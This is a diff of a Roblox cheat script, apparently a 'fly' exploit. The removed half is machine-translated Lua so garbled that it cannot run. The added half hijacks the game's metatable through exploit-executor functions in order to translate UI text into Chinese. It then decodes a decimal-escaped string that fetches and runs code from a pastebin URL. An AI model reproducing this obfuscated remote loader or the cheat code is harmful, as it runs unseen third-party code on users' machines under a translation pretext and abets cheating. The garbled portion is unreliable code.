@@ -1,224 +1,126 @@
-- Gui到Lua
--版本:3.2
+local Translations = {
 
--实例:
+   ["Close"] = "关闭",
+["Hide"] = "隐藏",
+["Up"] = "上",
+["Down"] = "下",
+["PTRKILLER FLY V1"] = "橙c美式飞行v3",
+["Lowest Speed (s)"] = "最低速度(秒)",
+["Fly"] = "飞行",
+["show"] = "显示"
+}
 
-local BeiFengFlyV3 = instance . new(" screen GUI ")
-local Main = Instance.new("Frame ")
-local top bar = instance . new(" Frame ")
-local Title = instance . new(" text label ")
-local Close = instance . new(" ImageButton ")
-local Minimize = instance . new(" ImageButton ")
-本地内容= Instance.new("Frame ")
-local Up = instance . new(" text button ")
-local Down = instance . new(" text button ")
-local Plus = instance . new(" text button ")
-local Mine = instance . new(" text button ")
-本地速度= Instance.new("TextLabel ")
-local Fly = instance . new(" text button ")
-
--属性:
-
-北风FlyV3。Name = "BeiFengFlyV3 "
-北风FlyV3。家长=游戏。players . local player:WaitForChild(" player GUI ")
-北风FlyV3。ResetOnSpawn = false
-
-主要的。Name = "Main "
-主要的。Parent = BeiFengFlyV3
-主要的。AnchorPoint = Vector2.new(0，0.5)
-Main.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
-Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Main.BorderSizePixel = 0
-Main.BackgroundTransparency = 1.000
-Main.Position = UDim2.new(0.100000001, 0, 0.449999988, 0)
-Main.Size = UDim2.new(0, 190, 0, 130)
-
-TopBar.Name = "TopBar"
-TopBar.Parent = Main
-TopBar.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
-TopBar.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TopBar.BorderSizePixel = 1
-TopBar.Size = UDim2.new(1, 0, 0, 30)
-
-Title.Name = "Title"
-Title.Parent = TopBar
-Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Title.BackgroundTransparency = 1.000
-Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Title.BorderSizePixel = 0
-Title.Size = UDim2.new(0, 115, 0, 30)
-Title.Font = Enum.Font.Ubuntu
-Title.Text = "橙子-飞行V3"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextSize = 17.000
-
-Close.Name = "Close"
-Close.Parent = TopBar
-Close.AnchorPoint = Vector2.new(1, 0)
-Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Close.BackgroundTransparency = 1.000
-Close.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Close.BorderSizePixel = 0
-Close.Position = UDim2.new(0.968421042, 0, 0.233333334, 0)
-Close.Size = UDim2.new(0, 15, 0, 15)
-Close.Image = "rbxassetid://7072725342"
-
-Minimize.Name = "Minimize"
-Minimize.Parent = TopBar
-Minimize.AnchorPoint = Vector2.new(1, 0)
-Minimize.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Minimize.BackgroundTransparency = 1.000
-Minimize.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Minimize.BorderSizePixel = 0
-Minimize.Position = UDim2.new(0.857894719, 0, 0.233333334, 0)
-Minimize.Size = UDim2.new(0, 15, 0, 15)
-Minimize.Image = "rbxassetid://7072719338"
-
-Content.Name = "Content"
-Content.Parent = Main
-Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Content.BackgroundTransparency = 1.000
-Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Content.BorderSizePixel = 0
-Content.Position = UDim2.new(0, 0, 0.230769232, 0)
-Content.Size = UDim2.new(1, 0, 1, -30)
-
-Up.Name = "Up"
-Up.Parent = Content
-Up.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
-Up.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Up.BorderSizePixel = 1
-Up.Size = UDim2.new(0, 50, 0, 50)
-Up.Font = Enum.Font.Ubuntu
-Up.Text = "上升"
-Up.TextColor3 = Color3.fromRGB(255, 255, 255)
-Up.TextSize = 18.000
-
-Down.Name = "Down"
-Down.Parent = Content
-Down.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
-Down.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Down.BorderSizePixel = 1
-Down.Position = UDim2.new(0, 0, 0.5, 0)
-Down.Size = UDim2.new(0, 50, 0, 50)
-Down.Font = Enum.Font.Ubuntu
-Down.Text = "下降"
-Down.TextColor3 = Color3.fromRGB(255, 255, 255)
-Down.TextSize = 18.000
-
-Plus.Name = "Plus"
-Plus.Parent = Content
-Plus.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
-Plus.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Plus.BorderSizePixel = 1
-Plus.Position = UDim2.new(0.263157904, 0, 0, 0)
-Plus.Size = UDim2.new(0, 50, 0, 50)
-Plus.Font = Enum.Font.Ubuntu
-Plus.Text = "+"
-Plus.TextColor3 = Color3.fromRGB(255, 255, 255)
-Plus.TextSize = 20.000
-
-Mine.Name = "Mine"
-Mine.Parent = Content
-Mine.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
-Mine.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Mine.BorderSizePixel = 1
-Mine.Position = UDim2.new(0.263157904, 0, 0.5, 0)
-Mine.Size = UDim2.new(0, 50, 0, 50)
-Mine.Font = Enum.Font.Ubuntu
-Mine.Text = "-"
-Mine.TextColor3 = Color3.fromRGB(255, 255, 255)
-Mine.TextSize = 28.000
-
-Speed.Name = "Speed"
-Speed.Parent = Content
-Speed.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-Speed.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Speed.BorderSizePixel = 1
-Speed.Position = UDim2.new(0.526315808, 0, 0, 0)
-Speed.Size = UDim2.new(0, 90, 0, 50)
-Speed.Font = Enum.Font.Cartoon
-Speed.Text = "1"
-Speed.TextColor3 = Color3.fromRGB(255, 255, 255)
-Speed.TextSize = 24.000
-
-Fly.Name = "Fly"
-Fly.Parent = Content
-Fly.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-Fly.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Fly.BorderSizePixel = 1
-Fly.Position = UDim2.new(0.526315808, 0, 0.5, 0)
-Fly.Size = UDim2.new(0, 90, 0, 50)
-Fly.Font = Enum.Font.Ubuntu
-Fly.Text = "飞"
-Fly.TextColor3 = Color3.fromRGB(255, 255, 255)
-Fly.TextSize = 20.000
-
-local UserInputService = game:GetService("UserInputService")
-local dragging
-local dragInput
-local dragStart
-local startPos
-
-local function update(input)
-	local delta = input.Position - dragStart
-	Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+local function translateText(text)
+    if not text or type(text) ~= "string" then return text end
+    
+    if Translations[text] then
+        return Translations[text]
+    end
+    
+    for en, cn in pairs(Translations) do
+        if text:find(en) then
+            return text:gsub(en, cn)
+        end
+    end
+    
+    return text
 end
 
-Main.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-		dragging = true
-		dragStart = input.Position
-		startPos = Main.Position
+local function setupTranslationEngine()
+    local success, err = pcall(function()
+        local oldIndex = getrawmetatable(game).__newindex
+        setreadonly(getrawmetatable(game), false)
+        
+        getrawmetatable(game).__newindex = newcclosure(function(t, k, v)
+            if (t:IsA("TextLabel") or t:IsA("TextButton") or t:IsA("TextBox")) and k == "Text" then
+                v = translateText(tostring(v))
+            end
+            return oldIndex(t, k, v)
+        end)
+        
+        setreadonly(getrawmetatable(game), true)
+    end)
+    
+    if not success then
+        warn("元表劫持失败:", err)
+       
+        local translated = {}
+        local function scanAndTranslate()
+            for _, gui in ipairs(game:GetService("CoreGui"):GetDescendants()) do
+                if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
+                    pcall(function()
+                        local text = gui.Text
+                        if text and text ~= "" then
+                            local translatedText = translateText(text)
+                            if translatedText ~= text then
+                                gui.Text = translatedText
+                                translated[gui] = true
+                            end
+                        end
+                    end)
+                end
+            end
+            
+            local player = game:GetService("Players").LocalPlayer
+            if player and player:FindFirstChild("PlayerGui") then
+                for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
+                    if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
+                        pcall(function()
+                            local text = gui.Text
+                            if text and text ~= "" then
+                                local translatedText = translateText(text)
+                                if translatedText ~= text then
+                                    gui.Text = translatedText
+                                    translated[gui] = true
+                                end
+                            end
+                        end)
+                    end
+                end
+            end
+        end
+        
+        local function setupDescendantListener(parent)
+            parent.DescendantAdded:Connect(function(descendant)
+                if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
+                    task.wait(0.1)
+                    pcall(function()
+                        local text = descendant.Text
+                        if text and text ~= "" then
+                            local translatedText = translateText(text)
+                            if translatedText ~= text then
+                                descendant.Text = translatedText
+                            end
+                        end
+                    end)
+                end
+            end)
+        end
+        
+        pcall(setupDescendantListener, game:GetService("CoreGui"))
+        local player = game:GetService("Players").LocalPlayer
+        if player and player:FindFirstChild("PlayerGui") then
+            pcall(setupDescendantListener, player.PlayerGui)
+        end
+        
+        while true do
+            scanAndTranslate()
+            task.wait(3)
+        end
+    end
+end
 
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragging = false
-			end
-		end)
-	end
+task.wait(2)
+
+setupTranslationEngine()
+
+local success, err = pcall(function()
+--这下面填加载外部脚本
+
+loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\90\66\122\99\84\109\49\102\34\41\41\40\41\10")()
+
 end)
 
-Main.InputChanged:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-		dragInput = input
-	end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-	if input == dragInput and dragging then
-		update(input)
-	end
-end)
-
-local Mini = false
-
-最小化。MouseButton1Click:Connect(函数()
-迷你=非迷你
-如果不是迷你，那么
-最小化。Image = "rbxassetid://7072720870 "
-其他
-最小化。Image = "rbxassetid://7072719338 "
-结束
-内容。可见=迷你
-结束)
-
-关闭。MouseButton1Click:Connect(函数()
-BeiFengFlyV3:Destroy()
-结束)
-
-nowe = false
-speeds = 1
-local speaker = game:GetService(“玩家”)。本地播放器
-
-飞吧。MouseButton1Down:connect(函数()
-	if nowe == true then		nowe = false
-扬声器。类人的:SetStateEnabled(枚举。HumanoidStateType.Climbing，true)
-扬声器。类人的:SetStateEnabled(枚举。HumanoidStateType.FallingDown，true)
-扬声器。类人的:SetStateEnabled(枚举。HumanoidStateType .飞天，真)
-扬声器。类人的:SetStateEnabled(枚举。HumanoidStateType.Freefall，true)
-扬声器。类人的:SetStateEnabled(枚举。HumanoidStateType.GettingUp，true)
-扬声器。类人的:SetStateEnabled(枚举。HumanoidStateType.Jumping，true)
-扬声器。类人的:SetStateEnabled(枚举。HumanoidStateType.Landed，true)
-扬声器。类人的:SetStateEnabled(枚举。HumanoidStateType .物理学，真)
-扬声器。性格，人性
+if not success then
+    warn("加载失败:", err)
+end
